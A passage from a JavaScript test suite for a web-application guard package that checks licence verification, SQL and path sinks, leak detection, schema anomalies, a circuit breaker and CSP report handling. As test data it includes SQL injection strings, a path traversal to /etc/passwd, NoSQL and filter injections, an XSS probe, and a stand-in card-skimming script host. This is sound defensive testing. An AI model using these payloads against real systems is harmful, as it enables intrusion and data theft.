  assert.equal((await g.decide('login', { user: 'h1' })).action, 'allow')
  const down = createGuard({ secret: 'bsec_x', fetch: async () => { throw new Error('down') }, mode: 'enforce', remote: { enabled: false }, report: { enabled: false } })
  assert.deepEqual(await down.decide('signup', { email: 'a@b.example' }), { action: 'allow', reasons: [], checked: false })
  assert.equal((await guard({ mode: 'enforce' }).decide('signup', {})).checked, false, 'without a key there is nobody to ask')
})

test('the list of blocked addresses is asked for with its tag, and an unchanged list (304) costs nothing and keeps working', async () => {
  const seen = []
  let t = 1_000_000
  const fetch = async (url, init = {}) => {
    seen.push(init.headers?.['if-none-match'] || null)
    if (init.headers?.['if-none-match'] === '"v1"') return { ok: false, status: 304 }
    return { ok: true, status: 200, headers: { get: (h) => (h === 'etag' ? '"v1"' : null) }, json: async () => ({ mode: 'strict', decisions: [{ ip: '198.51.100.9', action: 'block', expires_at: new Date(Date.now() + 600000).toISOString() }] }) }
  }
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403)
  t += 31_000
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'still blocked after a 304')
  await new Promise((r) => setTimeout(r, 10))
  assert.deepEqual(seen, [null, '"v1"'], 'the second download carried the tag')
})

// ---- the licence ----
import { createLicense } from './pkg/license.js'
import { generateKeyPairSync, sign as edSign, createHash } from 'node:crypto'

const keys = generateKeyPairSync('ed25519')
const other = generateKeyPairSync('ed25519')
const PUB = keys.publicKey.export({ type: 'spki', format: 'der' }).subarray(-32).toString('base64')
const kh = (secret) => createHash('sha256').update(secret).digest('hex').slice(0, 16)
const licenseFor = (secret, { exp = Math.floor(Date.now() / 1000) + 7 * 86400, key = keys.privateKey, v = 1, hash = kh(secret) } = {}) => {
  const body = Buffer.from(JSON.stringify({ v, site: 's1', kh: hash, plan: 'pro', iat: Math.floor(Date.now() / 1000), exp })).toString('base64url')
  return body + '.' + edSign(null, Buffer.from(body), key).toString('base64url')
}
const serverReturning = (handler) => {
  const calls = []
  const fetch = async (url, init) => {
    calls.push({ url, auth: init?.headers?.authorization })
    return handler(calls.length)
  }
  return { fetch, calls }
}
const ok = (lic) => new Response(JSON.stringify({ license: lic, renew_after_s: 21600 }), { status: 200 })

test('licence: a valid one signed by Bitora for this key turns the package on', async () => {
  const s = serverReturning(() => ok(licenseFor('bsec_k1')))
  const l = createLicense({ secret: 'bsec_k1', fetch: s.fetch, publicKey: PUB })
  assert.equal(l.usable(), false, 'before the first answer it is off')
  assert.equal(await l.ready(), true)
  assert.equal(l.status(), 'active')
  assert.equal(s.calls[0].auth, 'Bearer bsec_k1')
  assert.ok(s.calls[0].url.endsWith('/api/v1/guard/license'))
  assert.equal(l.usable(), true)
  assert.equal(s.calls.length, 1, 'it is kept, not asked for again')
})

test('licence: one for another key, signed by someone else, tampered or expired does not work', async () => {
  for (const [name, lic] of [
    ['another key', licenseFor('bsec_other')],
    ['signed by someone else', licenseFor('bsec_k1', { key: other.privateKey })],
    ['expired', licenseFor('bsec_k1', { exp: Math.floor(Date.now() / 1000) - 10 })],
    ['another version', licenseFor('bsec_k1', { v: 2 })],
    ['garbage', 'not.a.licence'],
    ['no signature', licenseFor('bsec_k1').split('.')[0]],
  ]) {
    const l = createLicense({ secret: 'bsec_k1', fetch: serverReturning(() => ok(lic)).fetch, publicKey: PUB })
    assert.equal(await l.ready(), false, name)
    assert.equal(l.status(), 'inactive', name)
  }
  const good = licenseFor('bsec_k1')
  const [body, sig] = good.split('.')
  const forged = Buffer.from(JSON.stringify({ ...JSON.parse(Buffer.from(body, 'base64url')), plan: 'enterprise' })).toString('base64url') + '.' + sig
  const l = createLicense({ secret: 'bsec_k1', fetch: serverReturning(() => ok(forged)).fetch, publicKey: PUB })
  assert.equal(await l.ready(), false, 'a changed licence does not verify')
})

test('licence: without a subscription (402) or with a key Bitora refuses (401) it stays off and does not insist', async () => {
  for (const [code, reason] of [
    [402, 'subscription_required'],
    [401, 'bad_key'],
  ]) {
    const s = serverReturning(() => new Response('{}', { status: code }))
    const l = createLicense({ secret: 'bsec_k1', fetch: s.fetch, publicKey: PUB })
    assert.equal(await l.ready(), false)
    assert.equal(l.reason(), reason)
    for (let i = 0; i < 5; i++) assert.equal(l.usable(), false)
    await l.ready()
    assert.equal(s.calls.length, 1, 'it does not ask again for a while: ' + reason)
  }
})

test('licence: without a key it is off and never calls anybody', async () => {
  const s = serverReturning(() => ok('x'))
  const l = createLicense({ secret: '', fetch: s.fetch, publicKey: PUB })
  assert.equal(await l.ready(), false)
  assert.equal(l.reason(), 'no_key')
  assert.equal(s.calls.length, 0)
})

test('licence: if Bitora cannot be reached a licence that is still valid keeps working, and it is renewed when due', async () => {
  let t = Date.now()
  let down = false
  const s = serverReturning(() => {
    if (down) throw new Error('network')
    return ok(licenseFor('bsec_k1'))
  })
  const l = createLicense({ secret: 'bsec_k1', fetch: s.fetch, publicKey: PUB, now: () => t })
  assert.equal(await l.ready(), true)
  down = true
  t += 7 * 3600 * 1000 // the renewal is due and Bitora is down
  assert.equal(l.usable(), true, 'the last licence is still good')
  await new Promise((r) => setTimeout(r, 20))
  assert.equal(l.usable(), true)
  assert.ok(s.calls.length >= 2, 'it tried to renew')
  t += 8 * 86400 * 1000 // the licence ran out and nobody answered
  assert.equal(l.usable(), false)
})

test('licence: one handed to the package at startup works without asking anybody', async () => {
  const s = serverReturning(() => ok('x'))
  const l = createLicense({ secret: 'bsec_k1', fetch: s.fetch, publicKey: PUB, token: licenseFor('bsec_k1') })
  assert.equal(await l.ready(), true)
  assert.equal(s.calls.length, 0)
  const bad = createLicense({ secret: 'bsec_k2', fetch: serverReturning(() => new Response('{}', { status: 402 })).fetch, publicKey: PUB, token: licenseFor('bsec_k1') })
  assert.equal(await bad.ready(), false, 'a licence for another key is not accepted')
})

test('without a licence the guard does nothing: traffic passes, nothing is reported or counted, and it never throws', async () => {
  const sent = []
  const fetch = async (url) => {
    sent.push(url)
    return new Response('{}', { status: 402 })
  }
  const g = realCreateGuard({ secret: 'bsec_k1', fetch, trustProxy: 1, mode: 'enforce', rateLimit: { max: 1, windowSec: 60 }, remote: { enabled: false } })
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).action, 'allow', 'the rate limit does not apply')
  g.observe(req('/login', { method: 'POST' }), { status: 401 })
  g.note('ssrf_blocked', { ip: '198.51.100.9' })
  assert.equal(g.signup({ email: 'a@mailinator.com', ip: '198.51.100.9' }).action, 'allow')
  assert.equal(g.flow('x', { ip: '198.51.100.9' }).action, 'allow')
  assert.equal((await g.limit('x', { key: 'k', max: 1 })).allowed, true)
  assert.equal((await g.decide('signup', { email: 'a@b.co', ip: '198.51.100.9' })).checked, false)
  assert.equal(g.inspect({ path: '/', search: "?q=' or 1=1--", agent: '', referer: '' }, undefined, Date.now()), null)
  await g.flush()
  assert.ok(sent.every((u) => u.endsWith('/api/v1/guard/license')), 'the only call it makes is the one for the licence: ' + sent.join(','))
  assert.equal(g.license.status(), 'inactive')
  assert.equal(g.license.reason(), 'subscription_required')
  const handler = async () => new Response('ok')
  assert.equal(await (await g.route(handler)(req('/'))).text(), 'ok')
})

test('with a licence the same guard protects', async () => {
  const lic = licenseFor('bsec_k1')
  const g = realCreateGuard({
    secret: 'bsec_k1',
    license: lic,
    __licensePublicKey: PUB,
    fetch: serverReturning(() => new Response('{}', { status: 200 })).fetch,
    trustProxy: 1,
    mode: 'enforce',
    rateLimit: { max: 1, windowSec: 60 },
    remote: { enabled: false },
    report: { enabled: false },
  })
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).action, 'allow')
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).action, 'block', 'the second request is over the limit')
  assert.equal(g.license.status(), 'active')
})

// ---- shadow rules (G14) ----
test('a rule in shadow mode is evaluated and reported but never adds points', () => {
  const normal = createShield()
  const shadow = createShield({ shadow: ['sqli.union'] })
  const q = "?q=1 UNION SELECT username,password FROM users"
  assert.ok(scoreOf(normal, { query: q }).score >= 5)
  const r = scoreOf(shadow, { query: q })
  assert.equal(r.score, 0, 'no points from a shadow rule')
  assert.deepEqual(r.shadow.map((m) => m.id), ['sqli.union'])
  // a family prefix covers all of it, other families are untouched
  const fam = createShield({ shadow: ['sqli'] })
  assert.equal(scoreOf(fam, { query: q }).score, 0)
  assert.ok(scoreOf(fam, { query: '?q=<script>alert(1)</script>' }).score >= 5)
})

test('shadow findings are reported as "would have" and the request goes through even in enforce mode', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: b.fetch, remote: { enabled: false }, shield: { shadow: ['sqli'] }, __license: { usable: () => true, ready: async () => true, status: () => 'active', reason: () => '' } })
  const out = await g.check(req('/api/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users', { ip: '198.51.100.20' }))
  assert.equal(out.action, 'allow', 'a shadow rule never refuses')
  await g.flush()
  const ev = b.calls.events.flat().find((e) => e.kind === 'shield')
  assert.ok(ev, 'a shield finding was reported')
  assert.equal(ev.would_have, true, 'reported as what it would have done')
  assert.ok(ev.rules.includes('sqli.union'))
  assert.ok(!(ev.score > 0), 'and it added no points')
})

// ---- sinks (G5) ----
import { createSinks, BlockedSinkError, sqlStructure, tokenizeSql } from './pkg/sinks.js'

test('sql sink: a value that stays inside one token is fine, one that changes the structure is not', () => {
  assert.equal(sqlStructure("SELECT * FROM users WHERE id = 42", ['42']).injected, false)
  assert.equal(sqlStructure("SELECT * FROM users WHERE name = 'alice'", ['alice']).injected, false)
  assert.equal(sqlStructure("SELECT * FROM users WHERE name = 'select union drop'", ['select union drop']).injected, false, 'keywords inside a string are text')
  assert.equal(sqlStructure("SELECT * FROM users WHERE name = 'O''Brien'", ["O'Brien"]).injected, false, 'properly escaped: the input does not even appear')
  assert.equal(sqlStructure("SELECT * FROM users WHERE id = 1 OR 1=1", ['1 OR 1=1']).injected, true, 'a tautology added to a number')
  assert.equal(sqlStructure("SELECT * FROM users WHERE name = '' OR '1'='1'", ["' OR '1'='1"]).injected, true, 'a quote that closes the string')
  assert.equal(sqlStructure("SELECT * FROM users WHERE name = 'x'; DROP TABLE users; --'", ["x'; DROP TABLE users; --"]).injected, true, 'stacked statement and comment')
  assert.equal(sqlStructure("SELECT * FROM t WHERE a = 1 -- AND b = 2", ['1 -- AND b = 2']).injected, true, 'a comment that cuts the rest of the query')
  assert.equal(sqlStructure("SELECT * FROM users", []).injected, false)
  assert.ok(tokenizeSql("a 'b''c' \"d\" 12 -- x").map((t) => t.type).join() === 'word,string,ident,number,comment')
})

test('the sinks only report in observe mode and throw in enforce mode', () => {
  const notes = []
  const guard = (mode) => ({ options: { mode }, licensed: () => true, note: (k, a) => notes.push([k, a.param]) })
  const observe = createSinks(guard('observe'))
  const q = "SELECT * FROM users WHERE id = 1 OR 1=1"
  assert.equal(observe.sql(q, ['1 OR 1=1']), q, 'observe: the call goes through')
  assert.deepEqual(notes.pop(), ['sink_blocked', 'sql'])
  const enforce = createSinks(guard('enforce'))
  assert.throws(() => enforce.sql(q, ['1 OR 1=1']), BlockedSinkError)
  assert.equal(enforce.sql("SELECT 1 WHERE id = 7", ['7']), 'SELECT 1 WHERE id = 7', 'a clean query is never blocked')
  assert.equal(notes.length, 1, 'and reports nothing')
})

test('path sink keeps a path inside its folder', () => {
  const notes = []
  const sinks = (mode) => createSinks({ options: { mode }, licensed: () => true, note: (k, a) => notes.push(a.param) })
  assert.ok(sinks('enforce').path('/srv/uploads', 'a', 'b.txt').endsWith('b.txt'))
  assert.throws(() => sinks('enforce').path('/srv/uploads', '../../etc/passwd'), BlockedSinkError)
  assert.throws(() => sinks('enforce').path('/srv/uploads', '/etc/passwd'), BlockedSinkError, 'an absolute part replaces the base')
  sinks('observe').path('/srv/uploads', '../x')
  assert.deepEqual(notes, ['path', 'path', 'path'], 'it reports when it throws too')
})

test('postgrest filter values and mass assignment', () => {
  const notes = []
  const sinks = (mode) => createSinks({ options: { mode }, licensed: () => true, note: (k, a) => notes.push(a.param) })
  assert.equal(sinks('observe').filterValue('ana'), 'ana')
  assert.equal(sinks('observe').filterValue('x),role.eq.admin,(y'), '"x),role.eq.admin,(y"', 'quoted so it stays one value')
  assert.throws(() => sinks('enforce').filterValue('a,b'), BlockedSinkError)
  const body = { name: 'Ana', email: 'a@x.co', role: 'admin', is_admin: true }
  assert.deepEqual(sinks('enforce').pick(body, ['name', 'email']), { name: 'Ana', email: 'a@x.co' }, 'extra fields are dropped, not only detected')
  assert.ok(notes.includes('mass-assignment'))
  assert.deepEqual(sinks('observe').pick({ name: 'Ana' }, ['name']), { name: 'Ana' })
})

test('without a licence the sinks do nothing', () => {
  const sinks = createSinks({ options: { mode: 'enforce' }, licensed: () => false, note: () => assert.fail('nothing is reported') })
  assert.equal(sinks.sql('SELECT 1 WHERE a = 1 OR 1=1', ['1 OR 1=1']), 'SELECT 1 WHERE a = 1 OR 1=1')
  assert.equal(sinks.filterValue('a,b'), 'a,b')
  assert.deepEqual(sinks.pick({ role: 'x' }, ['name']), { role: 'x' })
})

// ---- leaks in the answers (G6) ----
import { scanResponse, collector } from './pkg/leaks.js'

test('leaks: a stack trace, a database error, a secret and a debug page are recognised; ordinary answers are not', () => {
  const nodeTrace = "Error: boom\n    at handler (/app/src/orders.js:41:11)\n    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)\n    at next (/app/node_modules/express/lib/router/route.js:149:13)"
  const jwt = (p) => 'eyJhbGciOiJIUzI1NiJ9.' + Buffer.from(JSON.stringify(p)).toString('base64url') + '.c2lnbmF0dXJlLXNpZw'
  const kinds = (body, extra = {}) => scanResponse({ status: 500, contentType: 'text/html', body, ...extra })
  assert.deepEqual(kinds(nodeTrace), ['stack-trace'])
  assert.deepEqual(kinds('Traceback (most recent call last):\n  File "app.py", line 3, in <module>'), ['stack-trace'])
  assert.deepEqual(kinds('{"error":"duplicate key value violates unique constraint \\"users_email_key\\""}', { contentType: 'application/json' }), ['db-error'])
  assert.deepEqual(kinds('You have an error in your SQL syntax; check the manual'), ['db-error'])
  assert.deepEqual(kinds('{"message":"relation \\"orders\\" does not exist"}', { contentType: 'application/json' }), ['db-error'])
  assert.ok(kinds('key: sk_live_' + 'a'.repeat(24)).includes('secret'))
  assert.ok(kinds('DATABASE_URL=postgres://admin:hunter2@db.internal:5432/app').includes('secret'))
  assert.ok(kinds('{"key":"' + jwt({ role: 'service_role', ref: 'abcdefghij' }) + '"}').includes('secret'), 'the service role key of Supabase')
  assert.ok(!kinds('{"token":"' + jwt({ role: 'anon', ref: 'abcdefghij' }) + '"}').includes('secret'), 'the anon key is public by design')
  assert.ok(kinds('<title>Werkzeug Debugger</title>').includes('debug'))
  // what must stay quiet
  for (const ok of ['{"ok":true,"items":[1,2,3]}', '<html><body><h1>Welcome</h1><p>at the end of the day (we) ship</p></body></html>', 'Read how to understand a stack trace and a SQL syntax guide', '{"token":"abc","error":"invalid password"}', '']) {
    assert.deepEqual(kinds(ok), [], 'ordinary: ' + ok.slice(0, 40))
  }
  assert.deepEqual(scanResponse({ status: 200, contentType: 'image/png', body: nodeTrace }), [], 'only text answers are read')
  assert.ok(!JSON.stringify(kinds(nodeTrace)).includes('/app/src'), 'only the kind comes back, never the text')
})

test('leaks: the collector keeps only the first bytes of a long answer', () => {
  const c = collector(100)
  c.add('a'.repeat(80))
  c.add(Buffer.from('b'.repeat(80)))
  c.add(undefined)
  assert.equal(c.text().length, 100)
})

test('leaks: observe() reports the kind when it is given the body, and nothing when it is not', async () => {
  const { guard, sent } = watched()
  const r = req('/api/orders/7?token=abc')
  guard.observe(r, { status: 500, contentType: 'text/html', body: 'Traceback (most recent call last):\n  File "x.py"' })
  guard.observe(req('/api/health'), { status: 200 })
  guard.observe(req('/api/ok'), { status: 200, contentType: 'application/json', body: '{"ok":true}' })
  await guard.flush()
  const leaks = sent.filter((e) => e.kind === 'response_leak')
  assert.equal(leaks.length, 1, JSON.stringify(sent))
  assert.equal(leaks[0].param, 'stack-trace')
  assert.ok(!JSON.stringify(leaks[0]).includes('token=abc'), 'the query string never leaves')
})

test('leaks: the Express adapter reads the first bytes of the answer only when asked to, and never changes it', async () => {
  for (const leaks of [false, true]) {
    const { guard, sent } = watched()
    const mw = bitoraExpress(guard, { leaks })
    const handlers = {}
    const written = []
    const res = { statusCode: 500, on: (e, f) => (handlers[e] = f), setHeader() {}, getHeader: () => 'text/html', write(c) { written.push(c); return true }, end(c) { if (c) written.push(c) } }
    const request = { method: 'GET', originalUrl: '/api/orders/7', url: '/api/orders/7', headers: { 'x-forwarded-for': '5.5.5.5' }, socket: { remoteAddress: '10.0.0.2' } }
    await new Promise((resolve) => mw(request, res, resolve))
    assert.equal(res.write('Traceback (most recent call last):\n'), true, 'the return value of write is kept')
    res.end('  File "app.py", line 3')
    handlers.finish()
    await guard.flush()
    assert.deepEqual(written, ['Traceback (most recent call last):\n', '  File "app.py", line 3'], 'the answer reaches the client untouched')
    assert.equal(sent.some((e) => e.kind === 'response_leak'), leaks, 'off by default, on when asked')
  }
})

// ---- schema learning (G7) ----
import { createSchema } from './pkg/schema.js'

test('schema: after enough ordinary traffic it notices an extra field, a field that changes type and a new method', () => {
  let t = 10_000_000_000 // a real clock is far past the first hour of 1970
  const s = createSchema({ minSamples: 5, now: () => t })
  const ok = (body, status = 200, method = 'POST') => s.observe({ method, tpl: '/api/profile', body, status })
  for (let i = 0; i < 6; i++) assert.deepEqual(ok({ name: 'Ana', email: 'a@x.co', age: 30 }), [], 'ordinary traffic is learned, not flagged')
  assert.deepEqual(ok({ name: 'Ana', email: 'a@x.co', is_admin: true }), [{ kind: 'field', name: 'is_admin' }], 'a field nobody sends')
  assert.deepEqual(ok({ name: { $ne: null }, email: 'a@x.co' }), [{ kind: 'type', name: 'name' }], 'a string that is an object: a NoSQL operator')
  assert.deepEqual(ok({ name: 'Ana' }, 200, 'DELETE'), [{ kind: 'method', name: 'DELETE' }], 'a method the route never saw')
  // the same anomaly is not repeated within the hour, and comes back after it
  assert.deepEqual(ok({ name: 'x', is_admin: true }), [])
  t += 3601 * 1000
  assert.equal(ok({ name: 'x', is_admin: true }).length, 1)
})

test('schema: it does not learn what it flagged, nor what the app refused, and it is quiet before it has enough samples', () => {
  const s = createSchema({ minSamples: 3 })
  assert.deepEqual(s.observe({ method: 'POST', tpl: '/x', body: { a: 1, evil: 1 }, status: 200 }), [], 'not enough samples yet')
  for (let i = 0; i < 3; i++) s.observe({ method: 'POST', tpl: '/y', body: { a: 1 }, status: 200 })
  s.observe({ method: 'POST', tpl: '/y', body: { a: 1, evil: 1 }, status: 200 }) // flagged: must not be learned
  assert.ok(!s.export().routes.find((r) => r.path === '/y').fields.some((f) => f.name === 'evil'))
  for (let i = 0; i < 5; i++) s.observe({ method: 'POST', tpl: '/z', body: { a: 1, bad: 2 }, status: 400 }) // refused: not learned
  assert.equal(s.export().routes.find((r) => r.path === '/z'), undefined)
})

test('schema: only names and types are kept, memory is bounded, and the exports describe what was learned', () => {
  const s = createSchema({ minSamples: 2, maxRoutes: 3 })
  for (let i = 0; i < 4; i++) {
    const body = { title: 'a secret title', qty: 2, tags: ['x'] }
    if (i % 2) body.note = 'n' // an optional field: a JSON body simply does not have it the other times
    s.observe({ method: 'POST', tpl: '/api/items', body, status: 201 })
  }
  const out = s.export()
  assert.ok(!JSON.stringify(out).includes('a secret title'), 'no value is kept')
  const route = out.routes[0]
  assert.equal(route.samples, 4)
  assert.deepEqual(route.fields.find((f) => f.name === 'qty'), { name: 'qty', types: ['number'], required: true })
  assert.equal(route.fields.find((f) => f.name === 'note').required, false)
  const oa = s.openapi()
  assert.equal(oa.paths['/api/items'].post.requestBody.content['application/json'].schema.properties.qty.type, 'number')
  const zod = s.zod()
  assert.match(zod, /"POST \/api\/items": z\.object\(\{/)
  assert.match(zod, /"qty": z\.number\(\)/)
  assert.match(zod, /"note": z\.string\(\)\.optional\(\)/)
  for (let i = 0; i < 10; i++) s.observe({ method: 'POST', tpl: '/r' + i, body: { a: 1 }, status: 200 })
  assert.ok(s.export().routes.length <= 3, 'the number of routes is bounded')
})

test('schema: the guard reports an unexpected field only when learning is on, and only the name travels', async () => {
  for (const enabled of [false, true]) {
    const { guard, sent } = watched({ learn: { enabled, minSamples: 3 } })
    const post = (body) => guard.observe({ method: 'POST', originalUrl: '/api/profile', url: '/api/profile', headers: { 'x-forwarded-for': '5.5.5.5' }, socket: { remoteAddress: '10.0.0.2' } }, { status: 200, requestBody: body })
    for (let i = 0; i < 4; i++) post({ name: 'Ana' })
    post({ name: 'Ana', role: 'admin', secretvalue: 'hunter2' })
    await guard.flush()
    const hits = sent.filter((e) => e.kind === 'unexpected_input')
    assert.equal(hits.length > 0, enabled, 'off by default')
    if (enabled) {
      assert.ok(hits.every((h) => /^field\.[a-z_]+$/.test(h.param)), JSON.stringify(hits))
      assert.ok(!JSON.stringify(hits).includes('hunter2'), 'a value never travels')
    }
  }
})

test('schema: repeating an attack does not teach the guard that it is normal', () => {
  let t = 10_000_000_000
  const s = createSchema({ minSamples: 3, now: () => t })
  for (let i = 0; i < 4; i++) s.observe({ method: 'POST', tpl: '/api/p', body: { name: 'a' }, status: 200 })
  for (let i = 0; i < 20; i++) s.observe({ method: 'POST', tpl: '/api/p', body: { name: 'a', role: 'admin' }, status: 200 }) // reported once, then silent
  assert.ok(!s.export().routes[0].fields.some((f) => f.name === 'role'), 'the field was never learned')
  t += 4000 * 1000
  assert.equal(s.observe({ method: 'POST', tpl: '/api/p', body: { name: 'a', role: 'admin' }, status: 200 }).length, 1, 'and it is reported again after the hour')
})

// ---- circuit breaker and off switch ----

import { createBreaker } from './pkg/breaker.js'

test('breaker: opens after consecutive failures, lets one probe through after the pause, doubles the pause on a failed probe and closes on success', () => {
  let t = 1_000_000
  const b = createBreaker({ now: () => t, threshold: 3, baseMs: 1000, maxMs: 4000 })
  for (let i = 0; i < 2; i++) {
    assert.ok(b.allow())
    b.fail()
  }
  assert.equal(b.state(), 'closed', 'two failures are not enough')
  assert.ok(b.allow())
  b.fail()
  assert.equal(b.state(), 'open')
  assert.equal(b.allow(), false, 'open: nobody asks')
  t += 1001
  assert.ok(b.allow(), 'the pause is over: one probe')
  assert.equal(b.allow(), false, 'only one probe at a time')
  b.fail()
  t += 1500
  assert.equal(b.allow(), false, 'the pause doubled to 2 s')
  t += 600
  assert.ok(b.allow())
  b.ok()
  assert.equal(b.state(), 'closed')
  assert.ok(b.allow() && b.allow(), 'closed again: everybody asks')
  for (let i = 0; i < 20; i++) {
    b.fail()
    t += 10_000
    b.allow()
  }
  b.fail()
  const before = t
  t += 4001
  assert.ok(b.allow(), 'the pause never grows past maxMs')
  assert.ok(t - before < 5000)
})

test('breaker: a Bitora that is down is asked a handful of times, not on every request, and the traffic is never held up', async () => {
  const b = fakeBitora({ fail: true })
  const g = createGuard({ secret: 'k', mode: 'enforce', fetch: b.fetch, remote: { mode: 'ip', blocking: true, timeoutMs: 50 } })
  for (let i = 0; i < 40; i++) assert.equal((await g.check(req('/', { ip: '198.51.100.' + (i + 1) }))).action, 'allow')
  assert.ok(b.calls.checks.length === 0, 'failed calls are not recorded as checks')
  let asked = 0
  const counting = async (...a) => {
    asked++
    throw new Error('down')
  }
  const g2 = createGuard({ secret: 'k', mode: 'enforce', fetch: counting, remote: { mode: 'ip', blocking: true, timeoutMs: 50 }, report: { enabled: false } })
  for (let i = 0; i < 40; i++) assert.equal((await g2.check(req('/', { ip: '198.51.100.' + (i + 1) }))).action, 'allow')
  assert.ok(asked <= 6, 'five failures open the breaker; the rest do not ask (asked ' + asked + ')')
  const d = await g2.decide('signup', { email: 'a@b.example' })
  assert.equal(d.checked, false)
  assert.ok(asked <= 6, 'decide shares the breaker')
})

test('off switch: options.disabled and BITORA_GUARD_DISABLED make the package inert, with nothing sent to Bitora', async () => {
  const b = fakeBitora({ action: 'block' })
  let off = true
  const g = createGuard({ secret: 'k', mode: 'enforce', fetch: b.fetch, disabled: () => off, remote: { mode: 'ip', blocking: true } })
  assert.equal((await g.check(req('/wp-admin/setup-config.php'))).action, 'allow', 'a trap would be blocked, but the package is off')
  assert.equal(g.inspect({ method: 'GET', path: '/', ip: '8.8.8.8' }, 'x', 1), null)
  assert.deepEqual(await g.decide('signup', { email: 'a@b.example' }), { action: 'allow', reasons: [], checked: false })
  await g.flush()
  assert.equal(b.calls.checks.length + b.calls.events.length, 0, 'nothing was asked or reported while it was off')
  off = false
  assert.equal((await g.check(req('/wp-admin/setup-config.php'))).action, 'block', 'and it works again when switched on, without a restart')

  process.env.BITORA_GUARD_DISABLED = '1'
  try {
    const g2 = createGuard({ secret: 'k', mode: 'enforce', fetch: b.fetch })
    assert.equal((await g2.check(req('/wp-admin/setup-config.php'))).action, 'allow')
  } finally {
    delete process.env.BITORA_GUARD_DISABLED
  }
})

test('limit: a shared store that is down or hangs is asked a few times and then skipped, and the request is never held up', async () => {
  let asked = 0
  const down = { hit: async () => { asked++; throw new Error('redis down') } }
  const g = createGuard({ secret: 'k', mode: 'enforce', store: down })
  for (let i = 0; i < 30; i++) assert.equal((await g.limit('coupon', { key: 'u' + i, max: 3 })).checked, false)
  assert.ok(asked <= 5, 'five failures open the breaker (asked ' + asked + ')')
  const hang = { hit: () => new Promise(() => {}) }
  const g2 = createGuard({ secret: 'k', mode: 'enforce', store: hang })
  const t0 = Date.now()
  const r = await g2.limit('coupon', { key: 'u', max: 3 })
  assert.equal(r.checked, false)
  assert.ok(Date.now() - t0 < 1500, 'a hanging store is cut after half a second')
})

// ---- strict CSP as a trial (report-only) and the collector of its reports ----

import { cspHeaders, parseReports } from './pkg/csp.js'

test('headers: a strict CSP, Trusted Types and Integrity-Policy, always report-only and with a nonce for your scripts', () => {
  const g = createGuard({ secret: 'k' })
  const { nonce, headers } = g.headers()
  assert.match(nonce, /^[A-Za-z0-9+/=]{16,}$/)
  assert.deepEqual(Object.keys(headers).sort(), ['Content-Security-Policy-Report-Only', 'Integrity-Policy-Report-Only', 'Reporting-Endpoints'])
  const csp = headers['Content-Security-Policy-Report-Only']
  for (const part of [`script-src 'nonce-${nonce}' 'strict-dynamic'`, "object-src 'none'", "base-uri 'none'", "require-trusted-types-for 'script'", 'report-uri /_bitora/r', 'report-to bitora']) assert.ok(csp.includes(part), part)
  assert.equal(headers['Reporting-Endpoints'], 'bitora="/_bitora/r"')
  assert.ok(!('Content-Security-Policy' in headers), 'it never blocks: no enforcing header')
  assert.notEqual(g.headers().nonce, nonce, 'a new nonce each time')
  const custom = cspHeaders({ nonce: 'abcdEFGH12345678', reportPath: '/r', trustedTypes: false, integrity: false })
  assert.ok(!custom.headers['Content-Security-Policy-Report-Only'].includes('trusted-types'))
  assert.ok(!('Integrity-Policy-Report-Only' in custom.headers))
  assert.throws(() => cspHeaders({ nonce: "x' 'unsafe-inline" }), TypeError, 'a nonce cannot carry other CSP words')
  assert.throws(() => cspHeaders({ reportPath: 'https://evil.example/r' }), TypeError, 'reports go to a path of your own site')
  const inert = realCreateGuard({ secret: 'k' }) // no licence: no headers, but the nonce still works in your templates
  const h = inert.headers()
  assert.deepEqual(h.headers, {})
  assert.ok(h.nonce)
})

test('reports: both browser formats are reduced to the directive and the host, and nothing else is kept', () => {
  const old = JSON.stringify({ 'csp-report': { 'document-uri': 'https://shop.example.com/pay?token=SECRET', 'violated-directive': "script-src-elem 'nonce-x'", 'effective-directive': 'script-src-elem', 'blocked-uri': 'https://cdn.evil.example/skim.js?k=1', 'script-sample': 'const card = document.querySelector', 'source-file': 'https://shop.example.com/a.js', 'line-number': 3 } })
  const modern = JSON.stringify([
    { type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'inline', documentURL: 'https://shop.example.com/' } },
    { type: 'csp-violation', body: { effectiveDirective: 'require-trusted-types-for', blockedURL: 'trusted-types-sink', sample: 'innerHTML|<img src=x>' } },
    { type: 'network-error', body: {} },
    { type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'chrome-extension://abc/content.js' } },
  ])
  assert.deepEqual(parseReports(old), [{ directive: 'script-src-elem', blocked: 'cdn.evil.example' }])
  assert.deepEqual(parseReports(modern), [{ directive: 'script-src-elem', blocked: 'inline' }, { directive: 'require-trusted-types-for', blocked: 'sink' }])
  const all = JSON.stringify(parseReports(old)) + JSON.stringify(parseReports(modern))
  for (const secret of ['SECRET', 'skim.js', 'document.querySelector', 'innerHTML', 'token']) assert.ok(!all.includes(secret), 'must not keep ' + secret)
  assert.deepEqual(parseReports('not json'), [])
  assert.deepEqual(parseReports('{"csp-report":{"effective-directive":"<script>","blocked-uri":"https://a.example/x"}}'), [])
  assert.equal(parseReports(JSON.stringify(Array.from({ length: 50 }, () => ({ type: 'csp-violation', body: { effectiveDirective: 'script-src', blockedURL: 'inline' } })))).length, 20, 'at most 20 per post')
})

// The kind csp_violation becomes the rule CSP_REPORT_VIOLATION in the engine (internal/telemetry/guard.go).
test('reports: the guard answers 204 to the browser, tells Bitora only the kind of violation, and lets every other request pass', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'k', fetch: b.fetch, trustProxy: 1, remote: { enabled: false } })
  const post = (path, body, type = 'application/csp-report') => new Request('https://shop.example.com' + path, { method: 'POST', headers: { 'content-type': type, 'x-forwarded-for': '203.0.113.9' }, body })
  const rep = JSON.stringify({ 'csp-report': { 'effective-directive': 'script-src-elem', 'blocked-uri': 'https://cdn.evil.example/skim.js', 'document-uri': 'https://shop.example.com/pay?t=1' } })
